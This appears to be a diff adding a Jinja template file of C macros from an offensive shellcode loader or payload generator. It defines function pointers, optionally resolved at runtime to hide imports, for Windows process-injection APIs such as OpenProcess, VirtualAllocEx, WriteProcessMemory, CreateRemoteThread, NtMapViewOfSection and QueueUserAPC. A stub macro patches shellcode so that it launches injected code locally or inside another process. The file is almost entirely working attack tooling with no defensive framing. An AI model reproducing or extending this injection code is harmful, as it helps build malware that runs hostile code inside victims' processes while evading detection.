@@ -1,0 +1,123 @@
+{% macro function_definition(name, module = "KERNEL32.DLL") %}
+    {% if link.alloc.functions.value == "direct" %}
+        {# e.g OpenProcess_t pOpenProcess = OpenProcess; #}
+        {{ name }}_t p{{ name }} = {{ name }};
+    {% elif link.alloc.functions.value == "dynamic" %}
+        {# e.g. OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess"); #}
+        {{ name }}_t p{{ name }} = ({{ name }}_t) hlpGetProcAddress(hlpGetModuleHandle(L"{{ module }}"), "{{ name }}");
+    {% else %}
+        {{ raise("Function is not implemented" . link.alloc.functions) }}
+    {% endif %}
+{% endmacro %}
+
+{% macro function_typedef(name) %}
+    {% if name == "SuspendThread" %}
+        typedef DWORD (WINAPI * SuspendThread_t)(
+            HANDLE hThread
+        );
+    {% elif name == "GetThreadContext" %}
+        typedef BOOL (WINAPI * GetThreadContext_t)(
+            HANDLE hThread,
+            LPCONTEXT lpContext
+        );
+    {% elif name == "SetThreadContext" %}
+        typedef BOOL (WINAPI * SetThreadContext_t)(
+            HANDLE hThread,
+            const CONTEXT *lpContext
+        );
+    {% elif name == "ResumeThread" %}
+        typedef DWORD (WINAPI * ResumeThread_t)(
+            HANDLE hThread
+        );
+    {% elif name == "CreateRemoteThread" %}
+        typedef HANDLE (WINAPI * CreateRemoteThread_t)(
+            HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
+            LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId
+        );
+    {% elif name == "CreateThread" %}
+        typedef HANDLE (WINAPI * CreateThread_t)(
+            LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
+            LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId
+        );
+    {% elif name == "VirtualAlloc" %}
+        typedef LPVOID (WINAPI * VirtualAlloc_t)(
+            LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect
+        );
+    {% elif name == "VirtualProtect" %}
+        typedef BOOL (WINAPI *VirtualProtect_t)(
+            LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect
+        );
+    {% elif name == "OpenProcess" %}
+        typedef HANDLE (WINAPI * OpenProcess_t)(
+            DWORD dwDesiredAccess, BOOL bInhreitHandle, DWORD dwProcessId
+        );
+    {% elif name == "VirtualAllocEx" %}
+        typedef LPVOID (WINAPI * VirtualAllocEx_t)(
+            HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect
+        );
+    {% elif name == "WriteProcessMemory" %}
+        typedef BOOL (WINAPI *WriteProcessMemory_t)(
+            HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten
+        );
+    {% elif name == "VirtualProtectEx" %}
+        typedef BOOL (WINAPI *VirtualProtectEx_t)(
+            HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect
+        );
+    {% elif name == "NtCreateSection" %}
+        typedef NTSTATUS (NTAPI * NtCreateSection_t)(
+            OUT PHANDLE SectionHandle,
+            IN ULONG DesiredAccess,
+            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+            IN PLARGE_INTEGER MaximumSize OPTIONAL,
+            IN ULONG PageAttributess,
+            IN ULONG SectionAttributes,
+            IN HANDLE FileHandle OPTIONAL
+        );
+    {% elif name == "NtMapViewOfSection" %}
+        typedef NTSTATUS (NTAPI * NtMapViewOfSection_t)(
+            HANDLE SectionHandle,
+            HANDLE ProcessHandle,
+            PVOID * BaseAddress,
+            ULONG_PTR ZeroBits,
+            SIZE_T CommitSize,
+            PLARGE_INTEGER SectionOffset,
+            PSIZE_T ViewSize,
+            DWORD InheritDisposition,
+            ULONG AllocationType,
+            ULONG Win32Protect
+        );
+    {% elif name == "NtUnmapViewOfSection" %}
+        typedef NTSTATUS (NTAPI * NtUnmapViewOfSection_t)(
+            HANDLE ProcessHandle,
+            PVOID BaseAddress
+        );
+    {% elif name == "QueueUserAPC" %}
+        typedef DWORD (WINAPI *QueueUserAPC_t)(
+            PAPCFUNC pfnAPC,
+            HANDLE hThread,
+            ULONG_PTR dwData
+        );
+    {% else %}
+        {{ raise("Function is unknown" . name) }}
+    {% endif %}
+{% endmacro %}
+
+{% macro createThreadStub(type, shellCodeAddr, remoteCode) %}
+{% if stub and stub.yaml_tag == "!modifier.CreateThreadStub" %}
+    {{ function_definition("CreateThread") }}
+
+    void *remoteCodeOffset = (void*)((unsigned char *){{ shellCodeAddr }} + {{ stub.pRemoteCodeOffset() }});
+    void *createThreadOffset = (void*)((unsigned char *){{ shellCodeAddr }} + {{ stub.createThreadOffset() }});
+    void *remoteCodeAddr = (void*)((unsigned char *){{ remoteCode }} + {{ stub.offset() + stub.length() }});
+
+    {% if type == "local" %}
+        memcpy(remoteCodeOffset, &remoteCodeAddr, 8);
+        memcpy(createThreadOffset, &pCreateThread, 8);
+    {% elif type == "remote" %}
+        pWriteProcessMemory(hProc, remoteCodeOffset, &remoteCodeAddr, 8, NULL);
+        pWriteProcessMemory(hProc, createThreadOffset, &pCreateThread, 8, NULL);
+    {% endif %}
+{% endif %}
+{% endmacro %}
